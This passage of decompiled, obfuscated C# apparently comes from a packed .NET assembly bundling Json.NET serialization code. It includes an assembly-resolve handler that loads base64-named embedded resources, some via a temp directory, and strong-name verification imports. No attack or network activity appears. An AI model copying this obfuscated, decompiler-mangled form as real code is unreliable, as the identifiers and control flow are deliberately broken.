      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6858), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001[obj0.\u0002]));
label_8:
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6919), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001[obj0.\u0002]));
label_10:
      ((\u0012.\u0007) obj0).\u0001 = ch2;
      \u0014.\u0006.\u0001(obj0);
      return true;
    }

    static char \u0001([In] int obj0)
    {
      do
      {
        int num1 = obj0;
        int num2;
        for (int index = 9; num1 <= index; num1 = num2)
        {
          num2 = obj0;
          int num3 = 48;
          if (num3 != 0)
            return (char) (num2 + num3);
          index = num3;
        }
      }
      while (false);
      int num4 = obj0;
      int num5;
      while (true)
      {
        int num6 = 10;
        int num7;
        int num8;
        while (true)
        {
          num7 = num4 - num6;
          num8 = 97;
          if (num8 == 0)
          {
            num6 = num8;
            num4 = num7;
          }
          else
            break;
        }
        num5 = (int) (ushort) (num7 + num8);
        if (false)
          num4 = num5;
        else
          break;
      }
      return (char) num5;
    }

    static List<System.Type> \u0001([In] System.Type obj0, [In] DefaultContractResolver obj1)
    {
      System.Type type1;
      List<System.Type> typeList1;
      if (true)
      {
        if (true)
        {
          if (true)
          {
            List<System.Type> typeList2 = new List<System.Type>();
            if (true)
              typeList1 = typeList2;
            type1 = obj0;
          }
        }
        else
          goto label_6;
      }
      else
        goto label_5;
label_4:
      if ((object) type1 == null)
        goto label_6;
label_5:
      while ((object) type1 != (object) typeof (object))
      {
        List<System.Type> typeList3 = typeList1;
        System.Type type2 = type1;
        if (true)
          goto label_11;
label_3:
        if (true)
        {
          type1 = \u0015.\u000E.\u0001(type1);
          goto label_4;
        }
        else
          continue;
label_11:
        typeList3.Add(type2);
        goto label_3;
      }
label_6:
      typeList1.Reverse();
      return typeList1;
    }

    static bool \u0001([In] \u0011.\u0003 obj0, [In] char obj1)
    {
label_0:
      do
      {
        if (!\u009A.\u0008\u0004(obj1))
          goto label_8;
label_6:
        continue;
label_8:
        int num1 = (int) obj1;
        int num2 = 95;
        do
        {
          if (num2 != 0)
          {
            if (num1 != num2)
            {
              if (true)
              {
                int num3 = (int) obj1;
                num2 = 36;
                num1 = num3;
              }
              else
                goto label_0;
            }
            else
              goto label_6;
          }
        }
        while (num2 == 0);
        return num1 == num2;
      }
      while (false);
      return true;
    }

    static unsafe int \u0001([In] char[] obj0, [In] int obj1, [In] TimeSpan obj2, [In] \u000E.\u0001 obj3)
    {
      int num1 = 8;
      int num2;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
        obj0[obj1++] = obj2.Ticks >= 0L ? '+' : '-';
        *(int*) voidPtr = \u0007\u0003.\u008D\u0006(obj2.Hours);
        \u0014.\u0006.\u0001(2, obj0, *(int*) voidPtr, obj1);
        if (true)
        {
          obj1 += 2;
          if (obj3 == \u000E.\u0001.\u0001)
            obj0[obj1++] = ':';
        }
        *(int*) ((IntPtr) voidPtr + 4) = \u0007\u0003.\u008D\u0006(obj2.Minutes);
        \u0014.\u0006.\u0001(2, obj0, *(int*) ((IntPtr) voidPtr + 4), obj1);
        num2 = obj1;
        if (false)
          num1 = num2;
        else
          break;
      }
      obj1 = num2 + 2;
      return obj1;
    }

    static string \u0001([In] \u0015.\u0013 obj0)
    {
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(7020));
      do
      {
        if (obj0 is \u0002.\u0004)
          goto label_3;
label_1:
        continue;
label_3:
        obj0 = ((\u0002.\u0004) obj0).\u0004();
        goto label_1;
      }
      while (false);
      return obj0.\u0001().ToString();
    }

    static double? \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      if (!string.IsNullOrEmpty(obj1))
        goto label_5;
label_4:
      \u0014.\u0006.\u0001(obj0, JsonToken.Null, (object) null, false);
      return new double?();
label_5:
      double result;
      if (double.TryParse(obj1, NumberStyles.Float | NumberStyles.AllowThousands, (IFormatProvider) \u0014.\u0006.\u0001(obj0), out result))
      {
        \u0014.\u0006.\u0001(obj0, JsonToken.Float, (object) result, false);
        return new double?(result);
      }
      if (true)
      {
        \u0014.\u0006.\u0001(obj0, JsonToken.String, (object) obj1, false);
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(7029), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj1));
      }
      goto label_4;
    }

    static string \u0001([In] JsonProperty obj0) => obj0.\u0001;

    static void \u0001([In] \u001B obj0, [In] \u0013.\u0007 obj1)
    {
      \u0014.\u0006.\u0001(obj0, obj1);
      obj0.\u0002 = obj1;
    }

    static \u0015.\u0013 \u0001([In] object obj0) => obj0 is \u0015.\u0013 ? (\u0015.\u0013) obj0 : (\u0015.\u0013) new \u0006.\u0005(obj0);

    static \u0010.\u0007 \u0001([In] \u0010.\u0006 obj0)
    {
      if (((\u0016.\u0008) obj0).\u0001 == null)
        ((\u0016.\u0008) obj0).\u0001 = new \u0010.\u0007(obj0);
      return ((\u0016.\u0008) obj0).\u0001;
    }

    static void \u0001([In] \u000E.\u000F obj0, [In] System.Type obj1)
    {
      if (obj0.\u0001 != null)
        return;
      // ISSUE: type reference
      obj0.\u0001 = \u0014.\u0006.\u0001(obj1, (MethodBase) \u0012\u0002.\u007E\u0093\u0004((object) obj1, new System.Type[1]
      {
        \u0004\u0002.\u0084\u0004(__typeref (byte[]))
      }), new string[1]{ \u0014.\u0006.\u0082(6759) });
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0015.\u0013 obj0, [In] \u0015.\u0013 obj1) => obj0.\u0001 = obj1;

    static object \u0001([In] \u0016.\u0003 obj0, [In] \u0012.\u0007 obj1, [In] System.Type obj2) => obj0.\u0001(obj1, obj2);

    static JsonWriter.State[][] \u0001()
    {
      List<JsonWriter.State[]> list;
      do
      {
        if (true)
          list = ((IEnumerable<JsonWriter.State[]>) JsonWriter.\u0002).ToList<JsonWriter.State[]>();
      }
      while (false);
      JsonWriter.State[] stateArray1 = JsonWriter.\u0002[0];
      JsonWriter.State[] stateArray2 = JsonWriter.\u0002[7];
      // ISSUE: type reference
      IEnumerator<object> enumerator = \u0014.\u0006.\u0001(\u0004\u0002.\u0084\u0004(__typeref (JsonToken))).GetEnumerator();
label_4:
      try
      {
        while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
        {
          JsonToken current = (JsonToken) enumerator.Current;
          if ((JsonToken) list.Count <= current)
          {
            if (true)
            {
              switch (current)
              {
                case JsonToken.Integer:
                case JsonToken.Float:
                case JsonToken.String:
                case JsonToken.Boolean:
                case JsonToken.Null:
                case JsonToken.Undefined:
                case JsonToken.Date:
                case JsonToken.Bytes:
                  if (true)
                  {
                    list.Add(stateArray2);
                    continue;
                  }
                  goto label_4;
              }
            }
            list.Add(stateArray1);
          }
        }
      }
      finally
      {
        if (enumerator != null)
          global::\u0011.\u007E\u0007\u0002((object) enumerator);
      }
      return list.ToArray();
    }

    static System.Type \u0001([In] \u0012.\u0007 obj0)
    {
      JsonToken jsonToken;
      do
      {
        jsonToken = obj0.\u0001();
        switch (jsonToken)
        {
          case JsonToken.StartArray:
            goto label_8;
          case JsonToken.Integer:
          case JsonToken.Float:
          case JsonToken.String:
          case JsonToken.Boolean:
          case JsonToken.Date:
          case JsonToken.Bytes:
            goto label_7;
          case JsonToken.Null:
          case JsonToken.Undefined:
            continue;
          default:
            goto label_6;
        }
      }
      while (false);
      // ISSUE: type reference
      return \u0004\u0002.\u0084\u0004(__typeref (string));
label_6:
      throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(7086), (IFormatProvider) \u0098.\u0002\u0004(), (object) jsonToken));
label_7:
      return obj0.\u0001();
label_8:
      \u0014.\u0006.\u0001(obj0);
      if (true)
      {
        // ISSUE: type reference
        return obj0.\u0001() == JsonToken.StartObject ? \u0004\u0002.\u0084\u0004(__typeref (DataTable)) : \u0001\u0002.\u007E\u0080\u0004((object) \u0014.\u0006.\u0001(obj0));
      }
      goto label_6;
    }

    static unsafe object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0012.\u0007 obj1,
      [In] System.Type obj2,
      [In] \u0016.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6,
      [In] object obj7)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(2);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      System.Type type = obj2;
      if (obj0.\u0001.\u0001() != \u0008.\u0003.\u0003)
        goto label_41;
      else
        goto label_40;
label_4:
      object obj8;
      int num2;
      if (num2 != 0)
        return obj8;
label_8:
      if (\u0014.\u0006.\u0001(obj0, obj3))
        return (object) \u0014.\u0006.\u0001(obj0, obj1);
      string str1;
      switch (obj3.\u0001)
      {
        case \u0003.\u0005.\u0002:
          *(sbyte*) voidPtr = (sbyte) 0;
          \u0011.\u0008 obj9 = (\u0011.\u0008) obj3;
          object obj10 = obj7 == null || (object) type != (object) obj2 && !\u0093\u0002.\u007E\u0012\u0006((object) type, \u0001\u0002.\u007E\u0017\u0004(obj7)) ? \u0014.\u0006.\u0001(obj0, obj1, obj9, obj4, obj6, str1, ref *(bool*) voidPtr) : obj7;
          return *(sbyte*) voidPtr != (sbyte) 0 ? obj10 : obj0.\u0001(obj10, obj1, obj9, obj4, str1);
        case \u0003.\u0005.\u0004:
          \u0005.\u0008 obj11 = (\u0005.\u0008) obj3;
          if (obj0.\u0001.\u0001() != \u0008.\u0003.\u0003 && obj1.\u0001() == JsonToken.PropertyName && \u008E\u0002.\u0007\u0006(global::\u0001.\u007E\u0001(obj1.\u0001()), \u0014.\u0006.\u0082(7155), StringComparison.Ordinal))
          {
            \u0014.\u0006.\u0001(obj1);
            if (obj1.\u0001() == JsonToken.StartObject)
              throw \u0014.\u0006.\u0001(obj1, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(7164), (object) obj1.\u0001()));
            object obj12 = \u0014.\u0006.\u0001(obj0, obj1, type, (\u0016.\u0007) obj11, obj4, (\u0006.\u0002) null, (JsonProperty) null, obj7);
            \u0014.\u0006.\u0001(obj1);
            return obj12;
          }
          break;
        case \u0003.\u0005.\u0006:
          \u0003.\u0006 obj13 = (\u0003.\u0006) obj3;
          object obj14;
          if (obj7 == null)
          {
            // ISSUE: cast to a reference type
            IDictionary dictionary = \u0014.\u0006.\u0001(obj1, (bool&) ((IntPtr) voidPtr + 1), obj0, obj13);
            if (*(sbyte*) ((IntPtr) voidPtr + 1) != (sbyte) 0)
            {
              if (str1 != null)
                throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(7237), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
              num2 = \u0014.\u0006.\u0001(obj3).Count <= 0 ? \u0014.\u0006.\u0001(obj3).Count : throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(7383), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
              if (true)
              {
                if (num2 > 0)
                  throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(7529), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
                if (!\u0014.\u0006.\u0001(obj13))
                  throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(7659), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
              }
              else
                goto label_4;
            }
            \u0014.\u0006.\u0001(obj0, dictionary, obj1, obj13, obj4, str1);
            if (*(sbyte*) ((IntPtr) voidPtr + 1) != (sbyte) 0)
              return (obj13.\u0002 ?? \u0014.\u0006.\u0001(obj13))(new object[1]
              {
                (object) dictionary
              });
            if (dictionary is \u0010.\u0003)
              return ((\u0010.\u0003) dictionary).\u0001();
            obj14 = (object) dictionary;
          }
          else
            obj14 = \u0014.\u0006.\u0001(obj0, obj13.\u0001() ? (IDictionary) \u0014.\u0006.\u0001(obj13, obj7) : (IDictionary) obj7, obj1, obj13, obj4, str1);
          return obj14;
        case \u0003.\u0005.\u0008:
          \u0005.\u0007 obj15 = (\u0005.\u0007) obj3;
          return \u0014.\u0006.\u0001(str1, obj1, obj4, obj15, obj0);
      }
      string str2 = \u0002.\u0002.\u0001(\u0008\u0003.\u008E\u0006(\u0014.\u0006.\u0082(7740), global::\u0004.\u0097(), \u0014.\u0006.\u0082(7934), global::\u0004.\u0097()), (IFormatProvider) \u0098.\u0002\u0004(), (object) type, (object) \u0014.\u0006.\u0001(obj0, obj3));
      throw \u0014.\u0006.\u0001(obj1, str2);
label_40:
      \u0014.\u0006.\u0001(obj1);
      str1 = (string) null;
      goto label_8;
label_41:
      if (obj0.\u0001.\u0001() == \u0008.\u0003.\u0002)
      {
        if (!(obj1 is \u000E.\u000E obj16))
        {
          obj16 = (\u000E.\u000E) \u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj1));
          ((\u0012.\u0007) obj16).\u0001 = \u0014.\u0006.\u0001(obj1);
          ((\u0012.\u0007) obj16).\u0001 = obj1.\u0001;
          \u0014.\u0006.\u0001((\u0012.\u0007) obj16, obj1.\u0001);
          \u0014.\u0006.\u0001((\u0012.\u0007) obj16, obj1.\u0001);
          \u0014.\u0006.\u0001(obj1.\u0001, (\u0012.\u0007) obj16);
          obj16.\u0002(obj1.\u0004());
          \u0014.\u0006.\u0001((\u0012.\u0007) obj16);
          obj1 = (\u0012.\u0007) obj16;
        }
        num2 = \u0014.\u0006.\u0001(obj0, obj16, ref type, ref obj3, obj4, obj5, obj6, obj7, out obj8, ref str1) ? 1 : 0;
        goto label_4;
      }
      else
      {
        \u0014.\u0006.\u0001(obj1);
        object obj17;
        if (\u0014.\u0006.\u0001(obj6, obj0, obj1, obj4, ref str1, ref obj17, obj7, obj5, out type, ref obj3))
          return obj17;
        goto label_8;
      }
    }

    static void \u0001([In] \u0002.\u0004 obj0, [In] \u0015.\u0013 obj1)
    {
label_0:
      \u0014.\u0006.\u0001((\u0004.\u0011) obj0);
      do
      {
        \u0015.\u0013 obj = obj1 ?? (\u0015.\u0013) new \u0006.\u0005((object) null, JTokenType.Null);
        if (true)
        {
          if (obj0.\u0001.\u0001 != null)
            goto label_7;
          else
            goto label_6;
label_2:
          continue;
label_6:
          obj0.\u0001(0, obj, false);
          goto label_2;
label_7:
          obj0.\u0001(0, obj);
          if (false)
            goto label_2;
          else
            goto label_3;
        }
        else
          goto label_0;
      }
      while (false);
      return;
label_3:;
    }

    static unsafe int \u0001([In] \u0013.\u0007 obj0, [In] \u0016.\u0011 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(29);
      switch (obj0.\u0001())
      {
        case \u0010.\u0011.\u0001:
          return 8;
        case \u0010.\u0011.\u0002:
          \u0004.\u0014 obj2 = (\u0004.\u0014) obj0;
          string str = (string) ((\u0008.\u0011) obj2).\u0001;
          obj2.\u0002(str != null ? \u000E\u0003.\u007E\u008F\u0006((object) \u0016.\u0011.\u0001, str) : 0);
          \u0004.\u0014 obj3 = obj2;
          *(int*) ((IntPtr) voidPtr + 24) = obj2.\u0002();
          *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) obj2.\u0001();
          int num = \u0014.\u0006.\u0001((bool) *(sbyte*) ((IntPtr) voidPtr + 28), *(int*) ((IntPtr) voidPtr + 24), obj1);
          obj3.\u0001(num);
          return ((\u0013.\u0007) obj2).\u0001();
        case \u0010.\u0011.\u0003:
          \u0004.\u0013 obj4 = (\u0004.\u0013) obj0;
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          IEnumerator<\u0013.\u0008> enumerator1 = obj4.\u0001();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator1))
            {
              \u0013.\u0008 current = enumerator1.Current;
              *(int*) ((IntPtr) voidPtr + 12) = 1;
              *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + \u0014.\u0006.\u0001((\u0013.\u0007) current.\u0001(), obj1);
              *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + \u0014.\u0006.\u0001(current.\u0001(), obj1);
              *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + *(int*) ((IntPtr) voidPtr + 12);
            }
          }
          finally
          {
            if (enumerator1 != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator1);
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
          obj4.\u0001(*(int*) ((IntPtr) voidPtr + 8));
          return *(int*) ((IntPtr) voidPtr + 8);
        case \u0010.\u0011.\u0004:
          \u001A obj5 = (\u001A) obj0;
          *(int*) ((IntPtr) voidPtr + 16) = 4;
          *(long*) voidPtr = 0L;
          IEnumerator<\u0013.\u0007> enumerator2 = obj5.\u0001();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator2))
            {
              \u0013.\u0007 current = enumerator2.Current;
              *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
              *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + \u0014.\u0006.\u0001(\u0014.\u0006.\u0001((ulong) *(long*) voidPtr), obj1);
              *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + \u0014.\u0006.\u0001(current, obj1);
              *(long*) voidPtr = *(long*) voidPtr + 1L;
            }
          }
          finally
          {
            if (enumerator2 != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator2);
          }
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
          obj5.\u0001(*(int*) ((IntPtr) voidPtr + 16));
          return ((\u0013.\u0007) obj5).\u0001();
        case \u0010.\u0011.\u0005:
          \u0019 obj6 = (\u0019) obj0;
          obj6.\u0001(5 + ((byte[]) ((\u0008.\u0011) obj6).\u0001).Length);
          return ((\u0013.\u0007) obj6).\u0001();
        case \u0010.\u0011.\u0006:
        case \u0010.\u0011.\u000F:
          return 0;
        case \u0010.\u0011.\u0007:
          return 12;
        case \u0010.\u0011.\u0008:
          return 1;
        case \u0010.\u0011.\u000E:
          return 8;
        case \u0010.\u0011.\u0010:
          \u0011.\u000F obj7 = (\u0011.\u000F) obj0;
          *(int*) ((IntPtr) voidPtr + 20) = 0;
          *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + \u0014.\u0006.\u0001((\u0013.\u0007) obj7.\u0001(), obj1);
          *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + \u0014.\u0006.\u0001((\u0013.\u0007) obj7.\u0002(), obj1);
          obj7.\u0001(*(int*) ((IntPtr) voidPtr + 20));
          return ((\u0013.\u0007) obj7).\u0001();
        case \u0010.\u0011.\u0015:
          return 4;
        case \u0010.\u0011.\u0017:
          return 8;
        default:
          throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(8396), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(8401), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
      }
    }

    static unsafe Assembly \u0001(object _param0, ResolveEventArgs _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      \u000E.\u0010.\u0001 obj = new \u000E.\u0010.\u0001(_param1.Name);
      string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001(false)));
      string[] strArray = "ezAwMWMxNWRlLTg5ZTItNDNhNC04MTE3LWU4ZWU2ZWNkZThkMH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{1d306ce4-2d7f-4b51-b3a8-c565081db25d},ezAwMWMxNWRlLTg5ZTItNDNhNC04MTE3LWU4ZWU2ZWNkZThkMH0=,[z]{1d306ce4-2d7f-4b51-b3a8-c565081db25d}".Split(',');
      string str1 = string.Empty;
      *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < strArray.Length - 1)
      {
        if (strArray[*(int*) voidPtr] == base64String1)
        {
          str1 = strArray[*(int*) voidPtr + 1];
          break;
        }
        *(int*) voidPtr = *(int*) voidPtr + 2;
      }
label_5:
      if (str1.Length == 0 && obj.\u0003.Length == 0)
      {
        string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < strArray.Length - 1)
        {
          if (strArray[*(int*) ((IntPtr) voidPtr + 4)] == base64String2)
          {
            str1 = strArray[*(int*) ((IntPtr) voidPtr + 4) + 1];
            if (false)
              goto label_5;
            else
              break;
          }
          else
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 2;
        }
      }
      if (str1.Length > 0)
      {
        if (str1[0] == '[')
        {
          *(int*) ((IntPtr) voidPtr + 8) = str1.IndexOf(']');
          string str2 = str1.Substring(1, *(int*) ((IntPtr) voidPtr + 8) - 1);
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (str2.IndexOf('z') >= 0);
          *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (str2.IndexOf('t') >= 0);
          str1 = str1.Substring(*(int*) ((IntPtr) voidPtr + 8) + 1);
        }
        lock (\u000E.\u0010.\u0001)
        {
          if (\u000E.\u0010.\u0001.ContainsKey(str1))
            return \u000E.\u0010.\u0001[str1];
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
          if (manifestResourceStream != null)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) manifestResourceStream.Length;
            byte[] numArray = new byte[*(int*) ((IntPtr) voidPtr + 12)];
            manifestResourceStream.Read(numArray, 0, *(int*) ((IntPtr) voidPtr + 12));
            if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
              numArray = \u0014.\u0006.\u0001(numArray);
            Assembly assembly = (Assembly) null;
            if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
              catch (BadImageFormatException ex)
              {
                *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
              }
            }
            if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
            {
              try
              {
                string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                Directory.CreateDirectory(path1);
                string path2 = path1 + obj.\u0001 + ".dll";
                if (!System.IO.File.Exists(path2))
                {
                  FileStream fileStream = System.IO.File.OpenWrite(path2);
                  fileStream.Write(numArray, 0, numArray.Length);
                  fileStream.Close();
                  \u0014.\u0006.\u0001(path2, (string) null, 4);
                  \u0014.\u0006.\u0001(path1, (string) null, 4);
                }
                assembly = Assembly.LoadFile(path2);
              }
              catch
              {
              }
            }
            \u000E.\u0010.\u0001[str1] = assembly;
            return assembly;
          }
        }
      }
      return (Assembly) null;
    }

    static \u0005.\u0005 \u0001([In] IList<\u0005.\u0005> obj0, [In] System.Type obj1)
    {
      if (obj0 != null)
      {
label_1:
        int num1 = 0;
        if (num1 != 0)
          goto label_13;
        else
          goto label_15;
label_11:
        int index;
        if (true)
          num1 = index;
        else
          goto label_1;
label_13:
        if (num1 < obj0.Count)
        {
          \u0005.\u0005 obj = obj0[index];
          int num2 = obj.\u0001(obj1) ? 1 : 0;
          int num3;
          if (true)
          {
            if (true)
            {
              if (true)
              {
                if (num2 != 0)
                  return obj;
                num2 = index;
              }
              else
              {
                num3 = num2;
                goto label_10;
              }
            }
            else
            {
              num3 = num2;
              goto label_10;
            }
          }
          num3 = num2 + 1;
label_10:
          index = num3;
          goto label_11;
        }
        else
          goto label_14;
label_15:
        index = num1;
        goto label_11;
      }
label_14:
      return (\u0005.\u0005) null;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe void \u0001([In] Array obj0, [In] int[] obj1, [In] IList obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      *(int*) voidPtr = obj1.Length;
      if (*(int*) voidPtr == \u001F.\u007E\u0017\u0003((object) obj0))
      {
        \u000F\u0003.\u007E\u0090\u0006((object) obj0, \u0014.\u0006.\u0001(obj2, obj1), obj1);
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 4) = \u0010\u0003.\u007E\u0091\u0006((object) obj0, *(int*) voidPtr);
        if (\u001F.\u007E\u0013\u0003((object) (IList) \u0014.\u0006.\u0001(obj2, obj1)) != *(int*) ((IntPtr) voidPtr + 4))
          throw new Exception(\u0014.\u0006.\u0082(8454));
        int[] numArray = new int[*(int*) voidPtr + 1];
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (*(int*) ((IntPtr) voidPtr + 8) < *(int*) voidPtr)
        {
          numArray[*(int*) ((IntPtr) voidPtr + 8)] = obj1[*(int*) ((IntPtr) voidPtr + 8)];
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (*(int*) ((IntPtr) voidPtr + 12) < \u0010\u0003.\u007E\u0091\u0006((object) obj0, *(int*) voidPtr))
        {
          numArray[*(int*) voidPtr] = *(int*) ((IntPtr) voidPtr + 12);
          \u0014.\u0006.\u0001(obj0, numArray, obj2);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        }
      }
    }

    static void \u0001(
      [In] \u0016.\u0007 obj0,
      [In] \u0005.\u0005 obj1,
      [In] \u0006.\u0002 obj2,
      [In] JsonProperty obj3,
      [In] \u0010.\u0006 obj4,
      [In] JsonWriter obj5,
      [In] object obj6)
    {
      if (!\u0014.\u0006.\u0001(obj6, obj0, (JsonProperty) null, obj3, obj2, obj4))
      {
        if (!\u0014.\u0006.\u0001(obj4, obj5, obj6, (JsonProperty) null, obj0, obj2, obj3))
          return;
        obj4.\u0001.Add(obj6);
        if (((\u0016.\u0008) obj4).\u0001 != null && ((\u0016.\u0008) obj4).\u0001.\u0001() >= TraceLevel.Info)
          ((\u0016.\u0008) obj4).\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj5), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(8539), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004(obj6), (object) \u0001\u0002.\u007E\u0017\u0004((object) obj1))), (Exception) null);
        obj1.\u0001(obj5, obj6, (\u0016.\u0003) \u0014.\u0006.\u0001(obj4));
        if (((\u0016.\u0008) obj4).\u0001 != null && ((\u0016.\u0008) obj4).\u0001.\u0001() >= TraceLevel.Info)
          ((\u0016.\u0008) obj4).\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj5), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(8600), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004(obj6), (object) \u0001\u0002.\u007E\u0017\u0004((object) obj1))), (Exception) null);
        obj4.\u0001.RemoveAt(obj4.\u0001.Count - 1);
      }
      else
        \u0014.\u0006.\u0001(obj6, obj5, obj4);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] \u0011.\u0003 obj0, [In] char obj1)
    {
      do
      {
        if (obj1 > ')')
          goto label_24;
        else
          goto label_21;
label_16:
        continue;
label_21:
        switch ((int) obj1 - 9)
        {
          case 0:
          case 1:
          case 4:
            goto label_16;
          case 2:
          case 3:
            goto label_18;
        }
label_22:
        int num1 = (int) obj1;
        if (false)
          return num1 != 0;
        if (num1 != 32)
        {
          if (obj1 == ')')
          {
            if (((\u0012.\u0007) obj0).\u0001 == \u0012.\u0007.\u0001.\u0010 || ((\u0012.\u0007) obj0).\u0001 == \u0012.\u0007.\u0001.\u000F)
              return true;
            goto label_20;
          }
          else
            goto label_18;
        }
        else
          goto label_16;
label_24:
        if (obj1 > '/')
